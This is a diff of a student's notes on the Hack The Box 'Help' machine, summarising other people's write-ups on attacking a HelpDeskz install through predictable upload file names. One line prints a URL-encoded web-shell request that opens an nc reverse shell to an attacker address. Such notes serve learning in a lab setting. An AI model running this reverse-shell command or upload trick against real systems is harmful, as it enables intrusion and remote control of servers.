@@ -149,8 +149,6 @@
 
 * ###  <span class="helpmach subtitle"> ExpressJs
    * They say there's an exploit on the expressjs if the header *X-Powered-By: Express* is included so I'll research more on that.
-   
-* ###  <span class="helpmach subtitle">HelpDeskz
 
 ### <span class="helpmach subtitle">Why I Got Stuck?  
 
@@ -161,7 +159,7 @@
 
 ### <span class="helpmach subtitle">Nice Things I Found in Someone Else's Write Up  
 
-* 0xRick's Writeup  
+* <span class="helpmach">0xRick's Writeup</span>  
   * So the Express wasn't a deadend after all it did have something useful which is *graphql* which is a query language for APIs (He stated that it needed alot of guessing and fuzzing).  
   
   * He kept checking the source code for the *helpdeskz* because, turns out, it's open source so he benefited from that alot. I think I might use that in the future too, look if the service is open source and check out its source code if I understand anything or find anything that would make me understand shit more.
@@ -189,7 +187,12 @@
      using it as follows  
      ```console
      http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff
-     ```
+     ```  
+
+* <span class="helpmach">Raj Chandel's Writeup</span>  
+  * He didn't use a python code or looped through the possibilities of times or even wrote a code for the time zone. What he states is that the code is using something called *Epoch Time* and there's a website online that can convert from normal time to epoch time so what we can do is take the timestamp on the response of the upload(I haven't tried if it works but it worked with him) and then convert it into epoch time and then concatenate the name of the file with this time and hash that into md5 which results in the name of the file as its saved and with that we can just visit the file with the path we talked about `/support/tickets/[FILE NAME]` and viola we've got the reverse shell.  
+
+* I will be skipping the parts of writeups where they state how to do privilage escalation and get root access in the hopes of doing so myself later when we learn how to do it.
 
 <br/><br/>
 
